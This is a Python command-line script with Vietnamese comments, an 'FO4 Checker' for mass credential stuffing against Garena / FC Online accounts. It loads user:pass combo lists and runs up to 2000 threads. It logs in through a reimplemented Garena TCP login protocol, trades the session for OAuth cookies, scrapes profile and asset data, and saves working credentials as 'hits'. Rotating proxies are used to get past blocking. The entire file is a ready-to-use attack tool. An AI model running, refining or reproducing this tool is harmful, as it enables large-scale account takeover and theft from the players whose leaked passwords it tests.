#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
FO4 Checker - CLI Version with Rotating Proxy
- Không dùng GUI
- Hỗ trợ nhiều luồng (threads)
- Proxy xoay từ proxyxoay.shop (nhập key, số lượng key)
- Lưu kết quả: hits.txt, fail.txt, error.txt
- Hiển thị status gọn trong terminal
"""

import sys
import os
import time
import socket
import struct
import hashlib
import random
import threading
import queue
import urllib.parse
import json
from typing import Optional, Dict, Any, List, Tuple
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("pip install requests")
    sys.exit(1)

# ============================================================
# Constants (giữ nguyên từ code gốc)
# ============================================================
HOST = "mconnect.gxx.garenanow.com"
PORT = 19000
CLIENT_PLATFORM_ANDROID = 17
CLIENT_VERSION = 283
CLIENT_TYPE = 4352
CMD_LOGIN_PREPARE = 256
CMD_LOGIN = 257
CMD_SSO_KEY_GET = 442
CMD_APP_OAUTH_LOGIN = 439
FO4_APP_ID = 100072
PACKET_VERSION = (CLIENT_PLATFORM_ANDROID << 24) + CLIENT_VERSION
CLIENT_ID_MASK = 4354
_pkt_counter = random.randint(0, 0x3FFFFF)
_pkt_counter_lock = threading.Lock()

DEFAULT_REDIRECT_URI = "https://ranking.fconline.garena.vn/login/callback"
PROFILE_URL = "https://ranking.fconline.garena.vn/api/user/profile"

# Proxy API
PROXY_API_URL = "https://topproxy.vn/proxyxoay/apigetkeyxoay.php"
# ============================================================
# XTEA / Proto / TCP (giữ nguyên logic từ code gốc)
# ============================================================
_XTEA_DELTA = 0x9E3779B9
_XTEA_ROUNDS = 32

def _mix(v):
    return ((v << 4) & 0xFFFFFFFF) ^ (v >> 5)

def _xtea_enc_block(v0, v1, key):
    k = struct.unpack("<4I", key)
    s = 0
    for _ in range(_XTEA_ROUNDS):
        v0 = (v0 + (((_mix(v1) + v1) & 0xFFFFFFFF) ^ ((s + k[s & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF
        s = (s + _XTEA_DELTA) & 0xFFFFFFFF
        v1 = (v1 + (((_mix(v0) + v0) & 0xFFFFFFFF) ^ ((s + k[(s >> 11) & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF
    return v0, v1

def _xtea_dec_block(v0, v1, key):
    k = struct.unpack("<4I", key)
    s = (_XTEA_DELTA * _XTEA_ROUNDS) & 0xFFFFFFFF
    for _ in range(_XTEA_ROUNDS):
        v1 = (v1 - (((_mix(v0) + v0) & 0xFFFFFFFF) ^ ((s + k[(s >> 11) & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF
        s = (s - _XTEA_DELTA) & 0xFFFFFFFF
        v0 = (v0 - (((_mix(v1) + v1) & 0xFFFFFFFF) ^ ((s + k[s & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF
    return v0, v1

def xtea_encrypt(data: bytes, key: bytes) -> bytes:
    pad = 8 - len(data) % 8
    data = data + bytes([pad] * pad)
    R = struct.unpack("<Q", os.urandom(8))[0]
    R_bytes = struct.pack("<Q", R)
    enc_R = struct.pack("<2I", *_xtea_enc_block(*struct.unpack("<2I", R_bytes), key))
    prev = enc_R
    out = bytearray(enc_R)
    pt_sum = R
    last_ct = enc_R
    for i in range(0, len(data), 8):
        pt_block = data[i : i + 8]
        pt_sum = (pt_sum + struct.unpack("<Q", pt_block)[0]) & 0xFFFFFFFFFFFFFFFF
        blk = bytes(a ^ b for a, b in zip(pt_block, prev))
        v0, v1 = _xtea_enc_block(*struct.unpack("<2I", blk), key)
        prev = struct.pack("<2I", v0, v1)
        last_ct = prev
        out.extend(prev)
    last_ct_val = struct.unpack("<Q", last_ct)[0]
    check_bytes = struct.pack("<Q", last_ct_val ^ pt_sum)
    out.extend(struct.pack("<2I", *_xtea_enc_block(*struct.unpack("<2I", check_bytes), key)))
    return bytes(out)

def xtea_decrypt(data: bytes, key: bytes) -> bytes:
    if len(data) < 24 or len(data) % 8 != 0:
        return data
    iv, body = data[:8], data[8:-8]
    out, prev = bytearray(), iv
    for i in range(0, len(body), 8):
        blk = body[i : i + 8]
        v0, v1 = _xtea_dec_block(*struct.unpack("<2I", blk), key)
        out.extend(bytes(a ^ b for a, b in zip(struct.pack("<2I", v0, v1), prev)))
        prev = blk
    if out:
        pad = out[-1]
        if 1 <= pad <= 8 and all(b == pad for b in out[-pad:]):
            out = out[:-pad]
    return bytes(out)

def _varint_enc(n):
    out = bytearray()
    while n > 0x7F:
        out.append((n & 0x7F) | 0x80)
        n >>= 7
    out.append(n & 0x7F)
    return bytes(out)

def _pf_varint(tag, n):
    return _varint_enc((tag << 3) | 0) + _varint_enc(n)

def _pf_bytes(tag, b):
    return _varint_enc((tag << 3) | 2) + _varint_enc(len(b)) + b

def _pf_str(tag, s):
    return _pf_bytes(tag, s.encode("utf-8"))

def _proto_decode(data):
    fields, pos = {}, 0
    def _store(fn, val):
        if fn in fields:
            prev = fields[fn]
            fields[fn] = prev + [val] if isinstance(prev, list) else [prev, val]
        else:
            fields[fn] = val
    while pos < len(data):
        try:
            key = shift = 0
            while True:
                b = data[pos]
                pos += 1
                key |= (b & 0x7F) << shift
                if not (b & 0x80):
                    break
                shift += 7
            fn, wt = key >> 3, key & 7
            if wt == 0:
                val = shift = 0
                while True:
                    b = data[pos]
                    pos += 1
                    val |= (b & 0x7F) << shift
                    if not (b & 0x80):
                        break
                    shift += 7
                _store(fn, val)
            elif wt == 2:
                ln = shift = 0
                while True:
                    b = data[pos]
                    pos += 1
                    ln |= (b & 0x7F) << shift
                    if not (b & 0x80):
                        break
                    shift += 7
                _store(fn, data[pos : pos + ln])
                pos += ln
            else:
                break
        except IndexError:
            break
    return fields

def _proto_get(fields, tag, default=None):
    v = fields.get(tag, default)
    if isinstance(v, list):
        return v[-1] if v else default
    return v

def _next_id():
    global _pkt_counter
    with _pkt_counter_lock:
        _pkt_counter = (_pkt_counter + 1) & 0x7FFFFFFF
        return CLIENT_ID_MASK | _pkt_counter

def _build_frame(cmd, body):
    hdr = (
        _pf_varint(1, PACKET_VERSION)
        + _pf_varint(2, _next_id())
        + _pf_varint(3, 2)
        + _pf_varint(4, cmd)
        + _pf_varint(6, int(time.time()))
    )
    payload = struct.pack(">H", len(hdr)) + hdr + body
    return struct.pack("<I", len(payload)) + payload

def _recvall(sock, n, timeout=None):
    if timeout is not None:
        old = sock.gettimeout()
        sock.settimeout(timeout)
    try:
        buf = b""
        while len(buf) < n:
            chunk = sock.recv(n - len(buf))
            if not chunk:
                raise ConnectionError("Connection dropped")
            buf += chunk
        return buf
    finally:
        if timeout is not None:
            sock.settimeout(old)

def _recv_frame(sock, timeout=None):
    size = struct.unpack("<I", _recvall(sock, 4, timeout))[0]
    payload = _recvall(sock, size, timeout)
    hdr_len = struct.unpack(">H", payload[:2])[0]
    raw_hdr = _proto_decode(payload[2 : 2 + hdr_len])
    hdr = {k: (_proto_get(raw_hdr, k) if isinstance(v, list) else v) for k, v in raw_hdr.items()}
    return hdr, payload[2 + hdr_len :]

def _recv_cmd_frame(sock, target_cmd, max_tries=5, timeout=None):
    for _ in range(max_tries):
        hdr, body = _recv_frame(sock, timeout)
        if hdr.get(4, 0) == target_cmd:
            return hdr, body
    return {5: -1}, b""

def _build_enc_frame(cmd, body, session_key):
    hdr = (
        _pf_varint(1, PACKET_VERSION)
        + _pf_varint(2, _next_id())
        + _pf_varint(3, 2)
        + _pf_varint(4, cmd)
        + _pf_varint(6, int(time.time()))
    )
    payload = struct.pack(">H", len(hdr)) + hdr + body
    enc = xtea_encrypt(payload, session_key)
    return struct.pack("<I", len(enc)) + enc

def _recv_enc_frame(sock, session_key, timeout=None):
    size = struct.unpack("<I", _recvall(sock, 4, timeout))[0]
    payload = xtea_decrypt(_recvall(sock, size, timeout), session_key)
    hdr_len = struct.unpack(">H", payload[:2])[0]
    raw_hdr = _proto_decode(payload[2 : 2 + hdr_len])
    hdr = {k: (_proto_get(raw_hdr, k) if isinstance(v, list) else v) for k, v in raw_hdr.items()}
    return hdr, payload[2 + hdr_len :]

def _send_cmd(sock, cmd, body, session_key, max_tries=5, timeout=None):
    if timeout is not None:
        old = sock.gettimeout()
        sock.settimeout(timeout)
    try:
        sock.sendall(_build_enc_frame(cmd, body, session_key))
        for _ in range(max_tries):
            hdr, resp_body = _recv_enc_frame(sock, session_key, timeout)
            if hdr.get(4, 0) == cmd:
                return hdr, resp_body
        return {5: -1}, b""
    finally:
        if timeout is not None:
            sock.settimeout(old)

def _account_type(account):
    if account.isdigit():
        return 3
    if "@" in account:
        return 2
    try:
        int(account)
        return 0
    except ValueError:
        return 1

def _build_login_prepare(account, rand_key):
    inner = (
        _pf_varint(1, 0)
        + _pf_varint(2, _account_type(account))
        + _pf_str(3, account)
        + _pf_varint(4, CLIENT_TYPE)
        + _pf_varint(5, CLIENT_VERSION)
    )
    return _pf_bytes(1, rand_key) + _pf_bytes(2, xtea_encrypt(inner, rand_key))

def _derive_login_key(password, salt, verify_code):
    md5hex = hashlib.md5(password.encode("utf-8")).hexdigest()
    inner_hex = hashlib.sha256((md5hex + salt).encode("utf-8")).digest().hex()
    xtea_key = hashlib.sha256((inner_hex + verify_code).encode("utf-8")).digest()[:16]
    return xtea_key, md5hex.encode("ascii")

def _build_login(account, password, salt, verify_code):
    xtea_key, pw_hash = _derive_login_key(password, salt, verify_code)
    inner = (
        _pf_bytes(1, pw_hash)
        + _pf_varint(2, 0)
        + _pf_bytes(3, _pf_varint(2, 4608))
        + _pf_bytes(4, os.urandom(16))
    )
    return _pf_bytes(1, xtea_encrypt(inner, xtea_key)), xtea_key

_HOST_IP = None
_HOST_IP_lock = threading.Lock()

def _resolve_host_ip(timeout=2):
    global _HOST_IP
    if _HOST_IP:
        return _HOST_IP
    with _HOST_IP_lock:
        if _HOST_IP:
            return _HOST_IP
        pool = [f"103.247.205.{i}" for i in range(14, 25)]
        random.shuffle(pool)
        for ip in pool:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout)
                s.connect((ip, PORT))
                s.close()
                _HOST_IP = ip
                return ip
            except Exception:
                continue
        try:
            _HOST_IP = socket.gethostbyname(HOST)
        except Exception:
            _HOST_IP = HOST
        return _HOST_IP

def login_garena(account, password, timeout=20, proxy=None):
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        # Nếu có proxy, cần implement SOCKS5/HTTP proxy cho socket
        # Tạm thời bỏ qua proxy cho phần socket (Garena login qua TCP trực tiếp)
        # Proxy chỉ dùng cho phần HTTP requests (ranking profile)
        sock.connect((_resolve_host_ip(), PORT))
        rand_key = os.urandom(16)
        sock.sendall(_build_frame(CMD_LOGIN_PREPARE, _build_login_prepare(account, rand_key)))
        hdr, body = _recv_cmd_frame(sock, CMD_LOGIN_PREPARE, timeout=timeout)
        if hdr.get(5, 0) != 0:
            return {"ok": False, "msg": f"Prepare failed: {hdr.get(5, 0)}"}
        prep_reply = _proto_decode(body)
        reply_key, reply_data = prep_reply.get(1, b""), prep_reply.get(2, b"")
        if not reply_key or not reply_data:
            return {"ok": False, "msg": "Empty prepare reply"}
        prep_data = _proto_decode(xtea_decrypt(reply_data, reply_key))
        salt = (
            prep_data.get(1, b"").decode("utf-8")
            if isinstance(prep_data.get(1, b""), bytes)
            else str(prep_data.get(1, ""))
        )
        verify_code = (
            prep_data.get(2, b"").decode("utf-8")
            if isinstance(prep_data.get(2, b""), bytes)
            else str(prep_data.get(2, ""))
        )
        login_body, xtea_key = _build_login(account, password, salt, verify_code)
        sock.sendall(_build_frame(CMD_LOGIN, login_body))
        hdr, body = _recv_cmd_frame(sock, CMD_LOGIN, timeout=timeout)
        if hdr.get(5, 0) != 0:
            return {"ok": False, "msg": f"Login failed: {hdr.get(5, 0)}"}
        enc_reply = _proto_decode(body).get(1, b"")
        if not enc_reply:
            return {"ok": False, "msg": "Empty login reply"}
        decoded = _proto_decode(xtea_decrypt(enc_reply, xtea_key))
        uid, session_key = decoded.get(1, 0), decoded.get(2, b"")
        if not uid or not session_key:
            return {"ok": False, "msg": "Missing uid/session_key"}
        hdr, sso_body = _send_cmd(sock, CMD_SSO_KEY_GET, b"", session_key, timeout=timeout)
        sso_key = None
        if hdr.get(5, 0) == 0:
            raw = _proto_decode(sso_body).get(1)
            if raw:
                sso_key = raw.decode("utf-8") if isinstance(raw, bytes) else str(raw)
        return {
            "ok": True,
            "uid": uid,
            "session_key": session_key,
            "sso_key": sso_key,
            "socket": sock,
        }
    except Exception as e:
        if sock:
            try:
                sock.close()
            except Exception:
                pass
        return {"ok": False, "msg": str(e)}

def grant_redirect_url(sock, session_key_bytes, redirect_uri, timeout=12):
    body = (
        _pf_varint(1, FO4_APP_ID)
        + _pf_str(2, redirect_uri)
        + _pf_varint(3, 1)
        + _pf_str(4, "")
        + _pf_varint(5, 0)
        + _pf_varint(6, CLIENT_PLATFORM_ANDROID)
    )
    hdr, resp = _send_cmd(sock, CMD_APP_OAUTH_LOGIN, body, session_key_bytes, max_tries=3, timeout=timeout)
    if hdr.get(5, 0) != 0:
        return ""
    fields = _proto_decode(resp)
    url = fields.get(2, b"")
    if isinstance(url, bytes):
        url = url.decode("utf-8")
    return url or ""

def fetch_ranking_cookies(redirect_url: str, proxy: Optional[str] = None) -> Dict[str, Any]:
    if not redirect_url:
        return {"ok": False, "msg": "empty redirect_url", "cookies": {}}
    UA = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/122.0.6261.128 Safari/537.36"
    )
    sess = requests.Session()
    sess.verify = False
    sess.headers.update({"User-Agent": UA})
    proxies = None
    if proxy:
        proxies = {"http": proxy, "https": proxy}
    try:
        r1 = sess.get(
            redirect_url,
            allow_redirects=True,
            timeout=15,
            headers={"User-Agent": UA, "Accept": "text/html,application/xhtml+xml,*/*"},
            proxies=proxies,
        )
        cookies = requests.utils.dict_from_cookiejar(sess.cookies)
        if len(cookies) < 1:
            sess.get("https://ranking.fconline.garena.vn/", allow_redirects=True, timeout=12, proxies=proxies)
            cookies = requests.utils.dict_from_cookiejar(sess.cookies)
        sess.get(
            PROFILE_URL,
            allow_redirects=True,
            timeout=15,
            headers={
                "User-Agent": UA,
                "Accept": "text/html,application/xhtml+xml,*/*",
                "Referer": "https://ranking.fconline.garena.vn/",
            },
            proxies=proxies,
        )
        cookies = requests.utils.dict_from_cookiejar(sess.cookies)
        return {
            "ok": True,
            "cookies": cookies,
            "cookie_header": "; ".join(f"{k}={v}" for k, v in cookies.items()),
            "final_url": str(r1.url),
            "status": r1.status_code,
            "session": sess,
        }
    except Exception as e:
        return {"ok": False, "msg": str(e), "cookies": {}}

def fetch_user_profile(sess=None, cookies=None, proxy: Optional[str] = None) -> Dict[str, Any]:
    UA = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/122.0.6261.128 Safari/537.36"
    )
    proxies = None
    if proxy:
        proxies = {"http": proxy, "https": proxy}
    try:
        if sess is None:
            sess = requests.Session()
            sess.verify = False
            if cookies:
                sess.cookies.update(cookies)
        cookies = cookies or requests.utils.dict_from_cookiejar(sess.cookies)
        csrf = cookies.get("csrftoken") or cookies.get("csrf_token") or ""
        headers = {
            "User-Agent": UA,
            "Accept": "application/json, text/plain, */*",
            "Referer": "https://ranking.fconline.garena.vn/ca-nhan",
            "Origin": "https://ranking.fconline.garena.vn",
            "X-Requested-With": "XMLHttpRequest",
        }
        if csrf:
            headers["X-CSRFToken"] = csrf
            headers["X-CSRF-Token"] = csrf
        r = sess.get(PROFILE_URL, headers=headers, timeout=20, allow_redirects=True, proxies=proxies)
        body_json = None
        try:
            body_json = r.json()
        except Exception:
            pass
        return {
            "ok": r.status_code == 200,
            "status": r.status_code,
            "json": body_json,
            "text": r.text,
            "headers": dict(r.headers),
            "cookies": cookies,
        }
    except Exception as e:
        return {"ok": False, "msg": str(e), "status": 0, "json": None, "text": ""}

def fmt_num(n) -> str:
    try:
        return f"{int(n):,}"
    except Exception:
        return str(n)

def div_name(div_val) -> str:
    if isinstance(div_val, (list, tuple)) and len(div_val) >= 2:
        return str(div_val[1])
    if isinstance(div_val, (list, tuple)) and len(div_val) == 1:
        return str(div_val[0])
    return str(div_val or "")

def build_hit_line(username: str, password: str, payload: dict) -> str:
    top_player = payload.get("top_player") or {}
    if not isinstance(top_player, dict):
        top_player = {}
    g10 = payload.get("grade_10", 0)
    g9 = payload.get("grade_9", 0)
    g8 = payload.get("grade_8", 0)
    g5 = payload.get("grade_5", 0)
    return (
        f"{username}:{password}"
        f" | Game Name : {payload.get('account_name', '')}"
        f" | Level : {payload.get('level', 0)}"
        f" | GTDH : {fmt_num(payload.get('team_price', 0))}"
        f" | MemberShip : {payload.get('membership', '')}"
        f" | +10 : {g10}"
        f" | +5 : {g5}"
        f" | +8 : {g8}"
        f" | +9 : {g9}"
        f" | BP : {fmt_num(payload.get('balance', 0))}"
        f" | Số Trận Đã Chơi : {payload.get('total_match_count', 0)}"
        f" | CTĐG : {top_player.get('name', '')}"
        f" [ Giá Trị Cầu Thủ : {fmt_num(top_player.get('price', 0))} ]"
        f" | Rank Cao Nhất : {div_name(payload.get('top_division'))}"
        f" | Rank Hiện Tại : {div_name(payload.get('current_division'))}"
    )

def check_one(username: str, password: str, proxy: Optional[str] = None, timeout: int = 20) -> Dict[str, Any]:
    lr = login_garena(username, password, timeout=timeout)
    if not lr.get("ok"):
        return {"ok": False, "msg": lr.get("msg", "Login fail")}

    sock = lr["socket"]
    session_key = lr["session_key"]
    uid = lr.get("uid")

    try:
        redirect_url = grant_redirect_url(sock, session_key, DEFAULT_REDIRECT_URI, timeout=12)
    finally:
        try:
            sock.close()
        except Exception:
            pass

    if not redirect_url or "code=" not in redirect_url:
        return {"ok": False, "msg": "Không lấy được OAuth code"}

    cookie_result = fetch_ranking_cookies(redirect_url, proxy=proxy)
    if not cookie_result.get("ok"):
        return {"ok": False, "msg": cookie_result.get("msg") or "Cookie fail"}

    cookies = cookie_result.get("cookies", {})
    profile = fetch_user_profile(sess=cookie_result.get("session"), cookies=cookies, proxy=proxy)

    js = profile.get("json")
    if not isinstance(js, dict):
        return {"ok": False, "msg": "Profile không phải JSON"}

    if js.get("status") != "successful" or not isinstance(js.get("payload"), dict):
        err = js.get("error_code") or js.get("error") or js.get("status") or "account_not_found"
        return {"ok": False, "msg": str(err)}

    payload = js["payload"]
    hit = build_hit_line(username, password, payload)
    return {"ok": True, "hit_line": hit, "payload": payload, "uid": uid}

# ============================================================
# PROXY MANAGER
# ============================================================
class ProxyManager:
    def __init__(self, api_keys: List[str], nhamang: str = "random", tinhthanh: str = "0"):
        self.api_keys = api_keys
        self.nhamang = nhamang
        self.tinhthanh = tinhthanh
        self.current_key_index = 0
        self.current_proxy = None
        self.last_fetch_time = 0
        self.lock = threading.Lock()

    def _fetch_proxy(self, key: str) -> Optional[str]:
        try:
            params = {
                "key": key,
                "nhamang": self.nhamang,
                "tinhthanh": self.tinhthanh,
            }
            r = requests.get(PROXY_API_URL, params=params, timeout=15, verify=False)
            if r.status_code != 200:
                return None
            data = r.json()
            if data.get("status") != 100:
                return None
            proxy_http = data.get("proxyhttp", "")
            if proxy_http:
                # Format: ip:port:user:pass hoặc ip:port
                parts = proxy_http.split(":")
                if len(parts) == 4:
                    return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
                elif len(parts) == 2:
                    return f"http://{parts[0]}:{parts[1]}"
            return None
        except Exception:
            return None

    def get_proxy(self, force_refresh: bool = False) -> Optional[str]:
        with self.lock:
            now = time.time()
            # Xoay proxy mỗi 61s hoặc khi force_refresh
            if force_refresh or (now - self.last_fetch_time > 61) or not self.current_proxy:
                key = self.api_keys[self.current_key_index % len(self.api_keys)]
                self.current_key_index += 1
                proxy = self._fetch_proxy(key)
                if proxy:
                    self.current_proxy = proxy
                    self.last_fetch_time = now
                    print(f"[PROXY] Đã lấy proxy mới: {proxy.split('@')[-1] if '@' in proxy else proxy}")
                else:
                    print(f"[PROXY] Không lấy được proxy từ key {key[:8]}...")
            return self.current_proxy

# ============================================================
# MAIN CLI
# ============================================================
def load_accounts(path: str) -> List[Tuple[str, str]]:
    accs = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if "|" in line:
                parts = line.split("|", 1)
            elif ":" in line:
                parts = line.split(":", 1)
            else:
                continue
            user = parts[0].strip()
            pw = parts[1].strip() if len(parts) > 1 else ""
            if user and pw:
                accs.append((user, pw))
    return accs

def print_status(total, done, success, fail, error, start_time):
    elapsed = time.time() - start_time
    cpm = (done / elapsed) * 60 if elapsed > 0 else 0
    # Xóa dòng cũ và in đè
    sys.stdout.write("\r")
    sys.stdout.write(
        f"📊 Total: {total} | ✅ Done: {done} | 🎯 Success: {success} | ❌ Fail: {fail} | ⚠️ Error: {error} | ⚡ CPM: {cpm:.0f}"
    )
    sys.stdout.flush()

def main():
    print("=" * 70)
    print("FO4 CHECKER - CLI VERSION WITH ROTATING PROXY")
    print("=" * 70)

    # Nhập file acc
    acc_file = input("📂 Nhập đường dẫn file acc (user:pass hoặc user|pass): ").strip().strip('"').strip("'")
    if not os.path.isfile(acc_file):
        print(f"❌ Không tìm thấy file: {acc_file}")
        return

    accounts = load_accounts(acc_file)
    if not accounts:
        print("❌ File không có tài khoản hợp lệ.")
        return

    total = len(accounts)
    print(f"✅ Đã đọc {total} tài khoản từ {acc_file}")

    # Nhập số luồng
    try:
        threads = int(input("🧵 Nhập số luồng (VD: 100, 500, 1000): ").strip())
    except ValueError:
        threads = 100
    threads = max(1, min(threads, 2000))
    print(f"🧵 Số luồng: {threads}")

    # Nhập số lượng proxy key
    try:
        num_keys = int(input("🔑 Nhập số lượng API key proxy: ").strip())
    except ValueError:
        num_keys = 1
    num_keys = max(1, num_keys)

    proxy_keys = []
    for i in range(num_keys):
        key = input(f"   Nhập API key proxy {i+1}/{num_keys}: ").strip()
        if key:
            proxy_keys.append(key)

    if not proxy_keys:
        print("⚠️ Không có proxy key nào. Sẽ chạy KHÔNG proxy (dễ bị block).")
        use_proxy = False
    else:
        use_proxy = True
        print(f"🔑 Đã nhập {len(proxy_keys)} key proxy.")

    # Nhập thư mục output
    out_dir = input("📁 Nhập thư mục lưu kết quả (Enter để dùng 'output'): ").strip().strip('"').strip("'")
    if not out_dir:
        out_dir = "output"
    os.makedirs(out_dir, exist_ok=True)

    hits_file = os.path.join(out_dir, "hits.txt")
    fail_file = os.path.join(out_dir, "fail.txt")
    error_file = os.path.join(out_dir, "error.txt")

    # Khởi tạo ProxyManager
    proxy_manager = None
    if use_proxy:
        proxy_manager = ProxyManager(proxy_keys)

    # Biến đếm (thread-safe)
    done_count = 0
    success_count = 0
    fail_count = 0
    error_count = 0
    lock = threading.Lock()
    start_time = time.time()

    # Hàm worker
    def worker(acc):
        nonlocal done_count, success_count, fail_count, error_count
        user, pw = acc
        proxy = proxy_manager.get_proxy() if proxy_manager else None
        try:
            result = check_one(user, pw, proxy=proxy)
        except Exception as e:
            result = {"ok": False, "msg": f"Exception: {e}", "error": True}

        with lock:
            done_count += 1
            if result.get("ok"):
                success_count += 1
                hit = result["hit_line"]
                with open(hits_file, "a", encoding="utf-8") as f:
                    f.write(hit + "\n")
                print(f"\n🎯 [HIT] {user}:{pw} | {result['payload'].get('account_name', '')}")
            elif result.get("error"):
                error_count += 1
                msg = result.get("msg", "Unknown error")
                with open(error_file, "a", encoding="utf-8") as f:
                    f.write(f"{user}:{pw} | {msg}\n")
            else:
                fail_count += 1
                msg = result.get("msg", "Unknown")
                with open(fail_file, "a", encoding="utf-8") as f:
                    f.write(f"{user}:{pw} | {msg}\n")

            print_status(total, done_count, success_count, fail_count, error_count, start_time)

    # Chạy với ThreadPoolExecutor
    print(f"\n🚀 Bắt đầu check {total} acc với {threads} luồng...")
    print("=" * 70)
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(worker, acc) for acc in accounts]
        for f in as_completed(futures):
            pass  # worker tự xử lý

    # Kết thúc
    elapsed = time.time() - start_time
    print("\n\n" + "=" * 70)
    print(f"✅ HOÀN THÀNH! Thời gian: {elapsed:.1f}s")
    print(f"📊 Tổng: {total} | 🎯 Success: {success_count} | ❌ Fail: {fail_count} | ⚠️ Error: {error_count}")
    print(f"📁 Hits: {os.path.abspath(hits_file)}")
    print(f"📁 Fail: {os.path.abspath(fail_file)}")
    print(f"📁 Error: {os.path.abspath(error_file)}")
    print("=" * 70)

if __name__ == "__main__":
    main()
